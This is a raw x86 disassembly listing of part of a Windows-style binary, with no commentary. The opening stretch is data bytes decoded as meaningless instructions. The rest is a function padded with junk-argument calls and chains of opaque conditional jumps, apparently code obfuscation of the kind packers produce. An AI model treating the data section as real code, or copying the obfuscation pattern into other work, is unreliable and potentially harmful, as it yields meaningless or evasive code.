  40559c:	adc    BYTE PTR [eax],al
  40559e:	add    BYTE PTR [edx],al
  4055a0:	xor    BYTE PTR [eax],cl
  4055a2:	add    BYTE PTR [eax+eax*1+0xa604a20],dh
  4055a9:	add    BYTE PTR [eax+0x20000017],al
  4055af:	add    BYTE PTR [eax],ah
  4055b1:	add    BYTE PTR [eax],0x40
  4055b4:	or     BYTE PTR [eax],al
  4055b6:	add    BYTE PTR [ecx+0x8500a0],al
  4055bc:	add    DWORD PTR [eax],eax
  4055be:	inc    eax
  4055bf:	xor    BYTE PTR [edx+0x18013040],ah
  4055c5:	add    BYTE PTR [ecx],cl
  4055c7:	add    BYTE PTR [eax],bl
  4055c9:	adc    BYTE PTR [eax+0x0],0x4
  4055cd:	jno    0x40554f
  4055cf:	and    BYTE PTR [ecx+ecx*4],0x0
  4055d3:	or     BYTE PTR [eax+0x18],cl
  4055d6:	add    BYTE PTR [ecx+0x8002032],dl
  4055dc:	inc    eax
  4055dd:	add    BYTE PTR [eax-0x3fffefff],al
  4055e3:	add    BYTE PTR [edx],al
  4055e5:	adc    BYTE PTR [eax+0x8000206],ah
  4055eb:	or     DWORD PTR [edx+0x0],edx
  4055ee:	add    BYTE PTR [eax+eax*1+0x4402d0e1],bh
  4055f5:	adc    al,BYTE PTR [ecx+eax*2+0x61100500]
  4055fc:	adc    BYTE PTR [edx+0x10924012],al
  405602:	push   eax
  405603:	or     BYTE PTR [eax+eax*1+0x44010800],0xc6
  40560b:	and    BYTE PTR [eax],al
  40560d:	add    BYTE PTR [eax],0x0
  405610:	rol    BYTE PTR [eax+0x4e],0x8
  405614:	inc    eax
  405615:	or     DWORD PTR [esp+eax*1],0xffffffa4
  405619:	add    BYTE PTR [eax],al
  40561b:	xchg   al,al
  40561d:	pusha  
  40561e:	or     BYTE PTR [ecx+ebp*2],dl
  405621:	cwde   
  405622:	or     eax,0x580e90
  405627:	sbb    DWORD PTR [edx-0x70],eax
  40562a:	sub    BYTE PTR [eax],dl
  40562c:	mov    al,cs:0x80564100
  405632:	shl    BYTE PTR [eax],1
  405634:	inc    ecx
  405635:	add    BYTE PTR [esi+0x1162001],al
  40563b:	add    BYTE PTR [ecx+0x3e057108],bl
  405641:	add    BYTE PTR [eax],cl
  405643:	add    BYTE PTR [eax],0x0
  405646:	nop
  405647:	add    BYTE PTR [eax],cl
  405649:	inc    eax
  40564a:	add    BYTE PTR [eax+0x2],ch
  40564d:	push   ss
  40564e:	and    BYTE PTR [ecx],cl
  405650:	adc    BYTE PTR [edx+0x40001902],0x8c
  405657:	add    BYTE PTR [eax],al
  405659:	inc    eax
  40565a:	add    dl,BYTE PTR [eax-0x38]
  40565d:	inc    eax
  40565e:	xor    dl,BYTE PTR [eax]
  405660:	add    BYTE PTR [eax],al
  405662:	add    BYTE PTR [eax+edx*1+0x40],al
  405666:	add    BYTE PTR [edx],cl
  405668:	add    dl,ah
  40566a:	add    al,0xe0
  40566c:	add    DWORD PTR [eax-0x6d],eax
  40566f:	and    eax,DWORD PTR [eax]
  405671:	or     esp,DWORD PTR [eax+eax*4]
  405674:	add    esp,edx
  405676:	mov    ds:0x70113270,al
  40567b:	add    al,BYTE PTR [eax]
  40567d:	add    al,0x0
  40567f:	add    BYTE PTR [eax+0x10],dh
  405682:	add    DWORD PTR ds:0xc20019,esi
  405688:	add    al,0x22
  40568a:	add    al,0x40
  40568c:	inc    edx
  40568d:	inc    edx
  40568e:	call   0xc052d6d4
  405693:	and    BYTE PTR [eax+0x3008020],ah
  405699:	add    BYTE PTR [eax+edx*2],al
  40569c:	add    BYTE PTR [eax],al
  40569e:	add    BYTE PTR [eax],dh
  4056a0:	nop
  4056a1:	mov    ds:0x209082,eax
  4056a6:	add    BYTE PTR [eax+0x24499000],bl
  4056ac:	push   es
  4056ad:	and    BYTE PTR [ecx],ah
  4056af:	adc    BYTE PTR [eax],al
  4056b1:	mov    BYTE PTR [eax+0x15],dl
  4056b4:	inc    esp
  4056b5:	and    DWORD PTR [ecx],0x21860c1
  4056bb:	adc    DWORD PTR [eax],0x20020204
  4056c1:	add    BYTE PTR [eax],al
  4056c3:	add    BYTE PTR [ecx],cl
  4056c5:	add    DWORD PTR [eax+0x4008250],eax
  4056cb:	add    cl,al
  4056cd:	add    BYTE PTR [eax],al
  4056cf:	and    BYTE PTR [eax+eiz*4],0x80
  4056d3:	adc    ah,cl
  4056d5:	or     al,al
  4056d7:	dec    esp
  4056d8:	add    al,al
  4056da:	lods   al,BYTE PTR ds:[esi]
  4056db:	or     al,BYTE PTR [edx]
  4056dd:	push   eax
  4056de:	inc    eax
  4056df:	add    BYTE PTR [eax],al
  4056e1:	nop
  4056e2:	add    al,0x41
  4056e4:	add    DWORD PTR [edx],eax
  4056e6:	add    BYTE PTR [ebx],0x21
  4056e9:	add    BYTE PTR [eax],al
  4056eb:	add    DWORD PTR [edx],edx
  4056ed:	add    BYTE PTR [eax+0x1d00e052],al
  4056f3:	add    BYTE PTR [eax],al
  4056f5:	and    BYTE PTR [ecx+0x17],al
  4056f8:	add    BYTE PTR [eax],al
  4056fa:	add    BYTE PTR [ecx],al
  4056fc:	adc    al,0x4
  4056fe:	popa   
  4056ff:	add    BYTE PTR [eax],bh
  405701:	or     BYTE PTR [eax],al
  405703:	or     DWORD PTR [eax],ebp
  405705:	nop
  405706:	rol    DWORD PTR [eax+0xe],1
  405709:	and    al,0x2e
  40570b:	add    al,BYTE PTR [eax+0x10]
  40570e:	or     BYTE PTR [eax],al
  405710:	push   es
  405711:	mov    ds:0x22820888,al
  405716:	sbb    DWORD PTR [ecx],edx
  405718:	adc    esp,DWORD PTR [eax]
  40571a:	add    BYTE PTR [eax+0xc],0xe0
  40571e:	add    BYTE PTR [ecx],al
  405720:	lds    esp,FWORD PTR [eax+0x40]
  405723:	adc    BYTE PTR [eax],cl
  405725:	inc    eax
  405726:	xor    cl,BYTE PTR [ebx+eax*2]
  405729:	inc    eax
  40572a:	and    BYTE PTR [eax],al
  40572c:	dec    edx
  40572d:	mov    al,ds:0x8810034
  405732:	adc    BYTE PTR [eax],0x80
  405735:	add    edx,DWORD PTR [eax]
  405737:	add    DWORD PTR [ecx],edx
  405739:	add    DWORD PTR [ecx],eax
  40573b:	add    BYTE PTR [eax+0x0],cl
	...
  405782:	add    BYTE PTR [eax],al
  405784:	push   ebp
  405785:	mov    ebp,esp
  405787:	sub    esp,0x68
  40578a:	mov    ecx,DWORD PTR ds:0x434088
  405790:	push   0xffffffb9
  405792:	call   0x408633
  405797:	add    esp,0x4
  40579a:	push   0x3f
  40579c:	push   0xffffffb8
  40579e:	push   0xeab80400
  4057a3:	call   0x408633
  4057a8:	add    esp,0xc
  4057ab:	push   ebx
  4057ac:	cmp    eax,DWORD PTR ds:0x434088
  4057b2:	je     0x4057c7
  4057b4:	add    eax,eax
  4057b6:	push   0xffffffd5
  4057b8:	push   0x7213ca00
  4057bd:	push   0x1a
  4057bf:	call   0x408379
  4057c4:	add    esp,0xc
  4057c7:	push   0x57
  4057c9:	push   0x22
  4057cb:	push   0x4a
  4057cd:	push   0xffffff82
  4057cf:	call   0x408020
  4057d4:	add    esp,0x10
  4057d7:	push   esi
  4057d8:	push   0xa2847b00
  4057dd:	push   0xffffffb5
  4057df:	push   0x2ee83400
  4057e4:	push   0x9a8f5b00
  4057e9:	call   0x408633
  4057ee:	add    esp,0x10
  4057f1:	push   edi
  4057f2:	push   0x26ed4b00
  4057f7:	push   0x57
  4057f9:	call   0x408633
  4057fe:	add    esp,0x8
  405801:	call   0x408379
  405806:	push   0xffffff8d
  405808:	push   0xffffff91
  40580a:	push   0x2a
  40580c:	call   0x4080ed
  405811:	add    esp,0xc
  405814:	push   0x5
  405816:	call   0x408020
  40581b:	add    esp,0x4
  40581e:	push   0x67
  405820:	push   0xffffffca
  405822:	push   0x3e
  405824:	push   0xffffffec
  405826:	push   0x3
  405828:	call   0x408633
  40582d:	add    esp,0x14
  405830:	mov    eax,0x27
  405835:	push   0xffffff9f
  405837:	push   0xb2425900
  40583c:	push   0x3b
  40583e:	push   0xffffffe6
  405840:	push   0x62828c00
  405845:	call   0x408020
  40584a:	add    esp,0x14
  40584d:	mov    eax,0x70
  405852:	push   0x42b26700
  405857:	push   0x40
  405859:	push   0x181b1c00
  40585e:	push   0xffffffca
  405860:	push   0x2
  405862:	call   0x408633
  405867:	add    esp,0x14
  40586a:	call   0x408020
  40586f:	push   0x37
  405871:	push   0x79
  405873:	call   0x408633
  405878:	add    esp,0x8
  40587b:	call   0x4080ed
  405880:	push   0x22aa9d00
  405885:	call   0x408379
  40588a:	add    esp,0x4
  40588d:	push   0xffffffbb
  40588f:	call   0x408020
  405894:	add    esp,0x4
  405897:	add    eax,eax
  405899:	push   0x71
  40589b:	call   0x408379
  4058a0:	add    esp,0x4
  4058a3:	push   0x2a
  4058a5:	call   0x4080ed
  4058aa:	add    esp,0x4
  4058ad:	cmp    eax,DWORD PTR ds:0x434088
  4058b3:	je     0x4058ce
  4058b5:	mov    ecx,eax
  4058b7:	test   ecx,0xe0
  4058bd:	jne    0x4058ce
  4058bf:	add    ecx,ecx
  4058c1:	push   0x5ac43800
  4058c6:	call   0x408020
  4058cb:	add    esp,0x4
  4058ce:	call   0x408633
  4058d3:	push   0xffffffb7
  4058d5:	push   0xd81fa300
  4058da:	push   0x7d
  4058dc:	push   0xca3ca900
  4058e1:	push   0xffffffe6
  4058e3:	call   0x4080ed
  4058e8:	add    esp,0x14
  4058eb:	push   0x683e8000
  4058f0:	push   0xa80e0b00
  4058f5:	push   0x48
  4058f7:	call   0x408020
  4058fc:	add    esp,0xc
  4058ff:	cmp    eax,0xb6de
  405904:	jne    0x405919
  405906:	test   eax,0x25
  40590b:	je     0x405919
  40590d:	push   0xffffffb3
  40590f:	push   0xffffffe6
  405911:	call   0x408020
  405916:	add    esp,0x8
  405919:	mov    DWORD PTR [ebp-0x5c],eax
  40591c:	push   0xfae3cf00
  405921:	call   0x408020
  405926:	add    esp,0x4
  405929:	push   0x18263700
  40592e:	push   0xf21add00
  405933:	push   0xffffffb8
  405935:	push   0x16
  405937:	call   0x4080ed
  40593c:	add    esp,0x10
  40593f:	call   0x4080ed
  405944:	push   0x63
  405946:	call   0x408633
  40594b:	add    esp,0x4
  40594e:	sub    DWORD PTR [ebp-0x5c],eax
  405951:	push   0x1687c400
  405956:	push   0x5693fa00
  40595b:	call   0x4080ed
  405960:	add    esp,0x8
  405963:	push   0xfffffff7
  405965:	push   0xffffffd4
  405967:	push   0xffffffba
  405969:	push   0x1c
  40596b:	push   0xdea09f00
  405970:	call   0x408020
  405975:	add    esp,0x14
  405978:	push   0xffffffcd
  40597a:	push   0x72553b00
  40597f:	push   0x1af97000
  405984:	push   0x76
  405986:	push   0xffffffaf
  405988:	call   0x4080ed
  40598d:	add    esp,0x14
  405990:	push   0x3222e200
  405995:	push   0xffffffb8
  405997:	push   0xea7ae200
  40599c:	call   0x4080ed
  4059a1:	add    esp,0xc
  4059a4:	add    eax,eax
  4059a6:	mov    edx,DWORD PTR [ebp-0x5c]
  4059a9:	push   0xf6875200
  4059ae:	push   0x22
  4059b0:	push   0x2e
  4059b2:	call   0x408020
  4059b7:	add    esp,0xc
  4059ba:	push   0xffffffe8
  4059bc:	push   0x12
  4059be:	call   0x408633
  4059c3:	add    esp,0x8
  4059c6:	push   0xffffffd1
  4059c8:	push   0x10
  4059ca:	push   0x487a6300
  4059cf:	call   0x408633
  4059d4:	add    esp,0xc
  4059d7:	push   0xe83c8b00
  4059dc:	call   0x4080ed
  4059e1:	add    esp,0x4
  4059e4:	call   0x408633
  4059e9:	push   0x4a
  4059eb:	push   0x0
  4059ed:	call   DWORD PTR ds:0x4131e0
  4059f3:	add    DWORD PTR [ebp-0x5c],eax
  4059f6:	mov    DWORD PTR [ebp-0x18],eax
  4059f9:	sub    DWORD PTR [ebp-0x5c],eax
  4059fc:	push   0xffffffd1
  4059fe:	push   0xffffffbe
  405a00:	call   0x408020
  405a05:	add    esp,0x8
  405a08:	lea    eax,[ebp-0x38]
  405a0b:	push   eax
  405a0c:	call   DWORD PTR ds:0x413204
  405a12:	mov    ebx,eax
  405a14:	mov    esi,DWORD PTR [ebp-0x5c]
  405a17:	sub    DWORD PTR [ebp-0x5c],ebx
  405a1a:	test   esi,0x46
  405a20:	je     0x405b7c
  405a26:	mov    edi,0x6d3e
  405a2b:	cmp    eax,DWORD PTR ds:0x434088
  405a31:	jne    0x405b7c
  405a37:	cmp    esi,0x56
  405a3a:	je     0x405b7c
  405a40:	sub    edi,ebx
  405a42:	cmp    edi,0xac1d
  405a48:	je     0x405b7c
  405a4e:	mov    ebx,DWORD PTR [ebp-0x5c]
  405a51:	add    ebx,ebx
  405a53:	test   esi,0x1
  405a59:	jne    0x405b7c
  405a5f:	sub    DWORD PTR [ebp-0x5c],ebx
  405a62:	mov    ecx,DWORD PTR [ebp-0x5c]
  405a65:	mov    edx,DWORD PTR [ebp-0x5c]
  405a68:	sub    DWORD PTR [ebp-0x5c],edx
  405a6b:	and    esi,eax
  405a6d:	and    ecx,eax
  405a6f:	sub    esi,edi
  405a71:	sub    DWORD PTR [ebp-0x5c],esi
  405a74:	cmp    ecx,eax
  405a76:	je     0x405b7c
  405a7c:	mov    edi,DWORD PTR [ebp-0x5c]
  405a7f:	test   edi,0x96
  405a85:	je     0x405b7c
  405a8b:	mov    DWORD PTR [ebp-0x5c],ecx
  405a8e:	add    edi,edx
  405a90:	mov    edx,0x22
  405a95:	mov    ecx,0x1c
  405a9a:	sub    edx,eax
  405a9c:	sub    edx,edi
  405a9e:	or     edx,edi
  405aa0:	cmp    edx,ebx
  405aa2:	je     0x405b7c
  405aa8:	mov    edi,DWORD PTR [ebp-0x5c]
  405aab:	cmp    edi,DWORD PTR ds:0x434088
  405ab1:	jne    0x405b7c
  405ab7:	add    ecx,ebx
  405ab9:	cmp    ecx,0x2c
  405abc:	je     0x405b7c
  405ac2:	cmp    edi,ebx
  405ac4:	jne    0x405b7c
  405aca:	sub    ecx,esi
  405acc:	cmp    edx,edi
  405ace:	je     0x405b7c
  405ad4:	mov    esi,DWORD PTR [ebp-0x5c]
  405ad7:	sub    DWORD PTR [ebp-0x5c],esi
  405ada:	mov    ebx,DWORD PTR [ebp-0x5c]
  405add:	cmp    ecx,DWORD PTR [ebp-0x3c]
  405ae0:	jne    0x405b7c
  405ae6:	add    edx,eax
  405ae8:	mov    esi,DWORD PTR [ebp-0x5c]
  405aeb:	sub    DWORD PTR [ebp-0x5c],edx
  405aee:	test   ecx,0x3a2c
  405af4:	jne    0x405b7c
  405afa:	add    esi,ebx
  405afc:	and    edi,esi
  405afe:	xor    DWORD PTR [ebp-0x5c],ecx
  405b01:	mov    ebx,0xa76d
  405b06:	add    edi,edx
  405b08:	mov    esi,DWORD PTR [ebp-0x5c]
  405b0b:	mov    DWORD PTR [ebp-0x5c],edi
  405b0e:	add    ebx,edx
  405b10:	cmp    ebx,edx
  405b12:	je     0x405b7c
  405b14:	cmp    edi,DWORD PTR [ebp-0x30]
  405b17:	jne    0x405b7c
  405b19:	mov    edi,DWORD PTR [ebp-0x5c]
  405b1c:	xor    ecx,ecx
  405b1e:	sub    esi,ebx
  405b20:	sub    ecx,ebx
  405b22:	and    edi,eax
  405b24:	cmp    ecx,DWORD PTR ds:0x434088
  405b2a:	je     0x405b7c
  405b2c:	cmp    edi,0x4aa3
  405b32:	jne    0x405b7c
  405b34:	sub    esi,edi
  405b36:	cmp    esi,DWORD PTR ds:0x434088
  405b3c:	jne    0x405b7c
  405b3e:	mov    edx,0x23
  405b43:	add    DWORD PTR [ebp-0x5c],ecx
  405b46:	add    DWORD PTR [ebp-0x5c],esi
  405b49:	and    edx,eax
  405b4b:	mov    ebx,DWORD PTR [ebp-0x5c]
  405b4e:	cmp    edx,DWORD PTR ds:0x434088
  405b54:	jne    0x405b7c
  405b56:	cmp    edi,0xffffffd9
  405b59:	jne    0x405b7c
  405b5b:	mov    ecx,DWORD PTR ds:0x434088
  405b61:	sub    DWORD PTR [ebp-0x5c],ecx
  405b64:	cmp    ebx,0x8648
  405b6a:	je     0x405b7c
  405b6c:	mov    ecx,0x48
  405b71:	sub    DWORD PTR [ebp-0x5c],edx
  405b74:	add    ecx,ecx
  405b76:	sub    DWORD PTR [ebp-0x5c],ecx
  405b79:	add    DWORD PTR [ebp-0x5c],ebx
  405b7c:	mov    DWORD PTR [ebp-0x4],eax
  405b7f:	push   0x881d0500
  405b84:	call   0x408379
  405b89:	add    esp,0x4
  405b8c:	call   DWORD PTR ds:0x413264
  405b92:	and    esi,edi
  405b94:	mov    edx,0x6b12
  405b99:	mov    ebx,DWORD PTR [ebp-0x5c]
  405b9c:	cmp    eax,DWORD PTR ds:0x434088
  405ba2:	je     0x405bbc
  405ba4:	and    ebx,edx
  405ba6:	xor    ecx,ecx
  405ba8:	mov    edi,0x63cf
  405bad:	add    ebx,edx
  405baf:	sub    edi,ebx
  405bb1:	mov    DWORD PTR [ebp-0x5c],ecx
  405bb4:	sub    DWORD PTR [ebp-0x5c],esi
  405bb7:	sub    edi,edx
  405bb9:	add    DWORD PTR [ebp-0x5c],edi
  405bbc:	test   eax,0xb8a7
  405bc1:	jne    0x405da9
  405bc7:	sub    DWORD PTR [ebp-0x5c],edi
  405bca:	xor    eax,eax
  405bcc:	sub    DWORD PTR [ebp-0x5c],eax
  405bcf:	mov    ebx,edi
  405bd1:	mov    esi,0x4d
  405bd6:	and    DWORD PTR [ebp-0x5c],edx
  405bd9:	cmp    ebx,DWORD PTR ds:0x434088
  405bdf:	jne    0x405bfb
  405be1:	mov    edi,DWORD PTR ds:0x43406c
  405be7:	mov    ecx,DWORD PTR [ebp-0x5c]
  405bea:	sub    esi,edi
  405bec:	add    ecx,esi
  405bee:	add    DWORD PTR [ebp-0x5c],edx
  405bf1:	mov    DWORD PTR [ebp-0x5c],ebx
  405bf4:	cmp    ecx,edx
  405bf6:	jne    0x405bfb
  405bf8:	add    DWORD PTR [ebp-0x5c],ecx
  405bfb:	mov    ebx,DWORD PTR ds:0x434088
  405c01:	sub    ecx,esi
  405c03:	mov    esi,edi
  405c05:	mov    edi,esi
  405c07:	add    DWORD PTR [ebp-0x5c],ecx
  405c0a:	sub    DWORD PTR [ebp-0x5c],edi
  405c0d:	cmp    ecx,DWORD PTR [ebp-0x58]
  405c10:	je     0x405c51
  405c12:	add    edi,esi
  405c14:	mov    esi,DWORD PTR [ebp-0x5c]
  405c17:	mov    ecx,DWORD PTR [ebp-0x5c]
  405c1a:	add    ecx,edi
  405c1c:	cmp    esi,0x71
  405c1f:	je     0x405c51
  405c21:	test   ecx,0x92
  405c27:	jne    0x405c51
  405c29:	xor    edi,edi
  405c2b:	mov    edx,DWORD PTR [ebp-0x5c]
  405c2e:	cmp    ecx,0x1079
  405c34:	jne    0x405c51
  405c36:	cmp    esi,ebx
  405c38:	je     0x405c51
  405c3a:	mov    edi,eax
  405c3c:	sub    ecx,eax
  405c3e:	add    DWORD PTR [ebp-0x5c],ecx
  405c41:	add    DWORD PTR [ebp-0x5c],ebx
  405c44:	and    esi,ecx
  405c46:	mov    DWORD PTR [ebp-0x8],esi
  405c49:	and    edx,esi
  405c4b:	xor    DWORD PTR [ebp-0x8],edi
  405c4e:	xor    DWORD PTR [ebp-0x8],edx
  405c51:	and    ebx,eax
  405c53:	mov    edi,DWORD PTR [ebp-0x5c]
  405c56:	push   0xeabdd100
  405c5b:	push   0x187de500
  405c60:	push   0x1d
  405c62:	push   0xea44bd00
  405c67:	call   0x408020
  405c6c:	add    esp,0x10
  405c6f:	push   0x38096000
  405c74:	push   0xee94ae00
  405c79:	push   0x6b
  405c7b:	push   0xf
  405c7d:	push   0xea658100
  405c82:	call   0x408020
  405c87:	add    esp,0x14
  405c8a:	push   0xa8ce100
  405c8f:	push   0x8
  405c91:	push   0x8aa76000
  405c96:	push   0xffffffea
  405c98:	call   0x408379
  405c9d:	add    esp,0x10
  405ca0:	push   0xea750b00
  405ca5:	push   0xea359b00
  405caa:	call   0x408633
  405caf:	add    esp,0x8
  405cb2:	mov    eax,edi
  405cb4:	push   0x57
  405cb6:	call   0x4080ed
  405cbb:	add    esp,0x4
  405cbe:	mov    esi,DWORD PTR ds:0x434088
  405cc4:	push   0xffffffcc
  405cc6:	call   0x408379
  405ccb:	add    esp,0x4
  405cce:	push   0x19
  405cd0:	push   0xffffffa4
  405cd2:	call   0x408633
  405cd7:	add    esp,0x8
  405cda:	mov    eax,DWORD PTR [ebp-0x5c]
  405cdd:	call   0x4080ed
  405ce2:	push   0xffffff91
  405ce4:	push   0x4d
  405ce6:	call   0x408379
  405ceb:	add    esp,0x8
  405cee:	call   0x4080ed
  405cf3:	push   0xffffffe1
  405cf5:	push   0xf2629d00
  405cfa:	push   0x38311700
  405cff:	push   0xffffffc2
  405d01:	call   0x408633
  405d06:	add    esp,0x10
  405d09:	push   0xb
  405d0b:	push   0x36c32000
  405d10:	push   0xffffffd8
  405d12:	push   0xea749900
  405d17:	push   0xea553d00
  405d1c:	call   0x408020
  405d21:	add    esp,0x14
  405d24:	push   0x98039200
  405d29:	call   0x408379
  405d2e:	add    esp,0x4
  405d31:	push   0x38566b00
  405d36:	push   0xffffffd9
  405d38:	push   0x723d6c00
  405d3d:	push   0xffffff84
  405d3f:	push   0x6b2f600
  405d44:	call   0x408020
  405d49:	add    esp,0x14
  405d4c:	push   0x24
  405d4e:	call   0x4080ed
  405d53:	add    esp,0x4
  405d56:	push   0x31
  405d58:	push   0xffffffde
  405d5a:	push   0xffffffa2
  405d5c:	push   0x5a
  405d5e:	push   0xf21e0300
  405d63:	call   0x408633
  405d68:	add    esp,0x14
  405d6b:	mov    DWORD PTR [ebp-0x5c],ebx
  405d6e:	push   0xffffff91
  405d70:	call   0x4080ed
  405d75:	add    esp,0x4
  405d78:	push   0xb2500600
  405d7d:	call   0x408379
  405d82:	add    esp,0x4
  405d85:	call   0x408379
  405d8a:	call   0x408020
  405d8f:	sub    DWORD PTR [ebp-0x5c],esi
  405d92:	call   0x408020
  405d97:	mov    DWORD PTR [ebp-0x54],ebx
  405d9a:	add    DWORD PTR [ebp-0x5c],edi
  405d9d:	push   0xffffff99
  405d9f:	push   0x7a
  405da1:	call   0x4080ed
  405da6:	add    esp,0x8
  405da9:	mov    ebx,DWORD PTR ds:0x434088
  405daf:	mov    edx,DWORD PTR [ebp-0x5c]
  405db2:	push   0x468eab00
  405db7:	push   0x45
  405db9:	push   0x722b7100
  405dbe:	call   0x408020
  405dc3:	add    esp,0xc
  405dc6:	call   0x408633
  405dcb:	and    ebx,esi
  405dcd:	push   0x2aa03400
  405dd2:	push   0xffffff90
  405dd4:	push   0xebe4800
  405dd9:	push   0x3adcab00
  405dde:	call   0x408020
  405de3:	add    esp,0x10
  405de6:	call   0x408020
  405deb:	push   0x7c
  405ded:	push   0xe6bf4a00
  405df2:	push   0xffffffd2
  405df4:	push   0xfaa0a800
  405df9:	call   0x408020
  405dfe:	add    esp,0x10
  405e01:	sub    DWORD PTR [ebp-0x5c],eax
  405e04:	push   0xffffffe0
  405e06:	push   0xffffffc2
  405e08:	push   0xc8443700
  405e0d:	push   0xe6e97100
  405e12:	push   0xcaa5f600
  405e17:	call   0x408020
  405e1c:	add    esp,0x14
  405e1f:	push   0x7f
  405e21:	push   0x628f1900
  405e26:	push   0x16c64a00
  405e2b:	push   0xffffff83
  405e2d:	call   0x408020
  405e32:	add    esp,0x10
  405e35:	push   0x48618e00
  405e3a:	push   0xe68db800
  405e3f:	push   0x56
  405e41:	push   0x8efe5e00
  405e46:	push   0x61
  405e48:	call   0x408633
  405e4d:	add    esp,0x14
  405e50:	add    DWORD PTR [ebp-0x5c],ebx
  405e53:	push   0xffffffbe
  405e55:	call   0x4080ed
  405e5a:	add    esp,0x4
  405e5d:	call   DWORD PTR ds:0x41324c
  405e63:	test   edi,0x3e38
  405e69:	je     0x405e82
  405e6b:	mov    esi,DWORD PTR [ebp-0x5c]
  405e6e:	cmp    edi,0xffffffc6
  405e71:	je     0x405e82
  405e73:	cmp    esi,0x5a
  405e76:	je     0x405e82
  405e78:	add    esi,ebx
  405e7a:	cmp    esi,0x17
  405e7d:	je     0x405e82
  405e7f:	add    DWORD PTR [ebp-0x5c],esi
  405e82:	cmp    eax,DWORD PTR [ebp-0x4]
  405e85:	jne    0x4063ef
  405e8b:	add    eax,esi
  405e8d:	push   0x53
  405e8f:	push   0xffffffb0
  405e91:	push   0x7692e400
  405e96:	call   0x408379
  405e9b:	add    esp,0xc
  405e9e:	mov    eax,0xa6
  405ea3:	mov    ebx,0x8280e0c2
  405ea8:	xor    esi,esi
  405eaa:	and    ebx,eax
  405eac:	sub    ebx,eax
  405eae:	sub    ebx,eax
  405eb0:	sub    DWORD PTR [ebp-0x5c],ebx
  405eb3:	add    esi,edi
  405eb5:	cmp    esi,0xffffff89
  405eb8:	je     0x405ec5
  405eba:	mov    edi,DWORD PTR ds:0x434088
  405ec0:	add    esi,edi
  405ec2:	add    DWORD PTR [ebp-0x5c],esi
  405ec5:	add    esi,esi
  405ec7:	add    DWORD PTR [ebp-0x5c],eax
  405eca:	mov    ebx,esi
  405ecc:	mov    DWORD PTR [ebp-0x5c],esi
  405ecf:	mov    edx,edi
  405ed1:	sub    ebx,eax
  405ed3:	add    DWORD PTR [ebp-0x5c],ebx
  405ed6:	or     edx,edi
  405ed8:	add    edi,edx
  405eda:	add    edi,eax
  405edc:	and    edx,eax
  405ede:	sub    DWORD PTR [ebp-0x5c],eax
  405ee1:	and    edx,eax
  405ee3:	sub    edx,esi
  405ee5:	add    edx,edx
  405ee7:	cmp    edx,eax
  405ee9:	jne    0x405f00
  405eeb:	sub    edx,ebx
  405eed:	sub    DWORD PTR [ebp-0x5c],edx
  405ef0:	xor    edx,edx
  405ef2:	xor    ecx,ecx
  405ef4:	sub    DWORD PTR [ebp-0x5c],edx
  405ef7:	add    ecx,edi
  405ef9:	sub    ecx,edi
  405efb:	add    ecx,ecx
  405efd:	or     DWORD PTR [ebp-0x5c],ecx
  405f00:	mov    ecx,0x1e
  405f05:	mov    edi,0x47
  405f0a:	mov    esi,DWORD PTR ds:0x43406c
  405f10:	mov    DWORD PTR [ebp-0x5c],esi
  405f13:	add    edi,ebx
  405f15:	test   edi,0xc041
  405f1b:	jne    0x405f35
  405f1d:	xor    esi,esi
  405f1f:	and    esi,ecx
  405f21:	sub    esi,eax
  405f23:	mov    ebx,DWORD PTR ds:0x434060
  405f29:	sub    DWORD PTR [ebp-0x5c],edi
  405f2c:	sub    DWORD PTR [ebp-0x5c],ebx
  405f2f:	add    DWORD PTR [ebp-0x5c],edx
  405f32:	or     DWORD PTR [ebp-0x5c],esi
  405f35:	mov    edx,0x1d
  405f3a:	or     edx,esi
  405f3c:	mov    edi,DWORD PTR [ebp-0x5c]
  405f3f:	test   edi,0x72cb
  405f45:	jne    0x40602f
  405f4b:	mov    ebx,DWORD PTR ds:0x43407c
  405f51:	add    edi,ecx
  405f53:	or     DWORD PTR [ebp-0x5c],edx
  405f56:	or     edi,eax
  405f58:	cmp    edi,ecx
  405f5a:	jne    0x405f5f
  405f5c:	or     DWORD PTR [ebp-0x5c],edi
  405f5f:	mov    edi,DWORD PTR [ebp-0x5c]
  405f62:	cmp    edi,DWORD PTR [ebp-0x30]
  405f65:	jne    0x40602f
  405f6b:	cmp    edi,DWORD PTR [ebp-0xc]
  405f6e:	jne    0x40602f
  405f74:	mov    edx,0x24
  405f79:	sub    DWORD PTR [ebp-0x5c],ebx
  405f7c:	mov    esi,DWORD PTR ds:0x43406c
  405f82:	or     edx,ecx
  405f84:	sub    edx,ebx
  405f86:	add    DWORD PTR [ebp-0x5c],eax
  405f89:	sub    DWORD PTR [ebp-0x5c],esi
  405f8c:	cmp    edi,DWORD PTR [ebp-0x28]
  405f8f:	je     0x40602f
  405f95:	add    DWORD PTR [ebp-0x5c],edx
  405f98:	sub    edi,esi
  405f9a:	cmp    edi,DWORD PTR ds:0x434060
  405fa0:	jne    0x40602f
  405fa6:	and    edi,esi
  405fa8:	xor    esi,esi
  405faa:	mov    ebx,DWORD PTR [ebp-0x5c]
  405fad:	sub    DWORD PTR [ebp-0x5c],esi
  405fb0:	cmp    ebx,DWORD PTR ds:0x434060
  405fb6:	je     0x40602f
  405fb8:	mov    edx,0x58
  405fbd:	add    edi,edx
  405fbf:	sub    edi,ebx
  405fc1:	cmp    edi,0x10
  405fc4:	je     0x40602f
  405fc6:	mov    esi,ebx
  405fc8:	mov    ebx,0x3a27
  405fcd:	sub    DWORD PTR [ebp-0x5c],esi
  405fd0:	sub    edi,ecx
  405fd2:	add    DWORD PTR [ebp-0x5c],ecx
  405fd5:	sub    edi,ecx
  405fd7:	add    DWORD PTR [ebp-0x5c],ebx
  405fda:	and    edi,ecx
  405fdc:	and    edi,ecx
  405fde:	cmp    edi,DWORD PTR [ebp-0xc]
  405fe1:	jne    0x40602f
  405fe3:	mov    edx,DWORD PTR [ebp-0x5c]
  405fe6:	mov    esi,DWORD PTR [ebp-0x5c]
  405fe9:	sub    DWORD PTR [ebp-0x5c],eax
  405fec:	cmp    edi,0xffffffa8
  405fef:	jne    0x40602f
  405ff1:	sub    DWORD PTR [ebp-0x5c],esi
  405ff4:	mov    ebx,DWORD PTR [ebp-0x5c]
  405ff7:	xor    DWORD PTR [ebp-0x5c],ecx
  405ffa:	and    edx,esi
  405ffc:	mov    esi,edx
  405ffe:	and    edi,ebx
  406000:	sub    DWORD PTR [ebp-0x5c],esi
  406003:	cmp    edi,0xffffff81
  406006:	jne    0x40602f
  406008:	mov    ebx,DWORD PTR ds:0x43407c
  40600e:	add    edi,edi
  406010:	and    edi,ecx
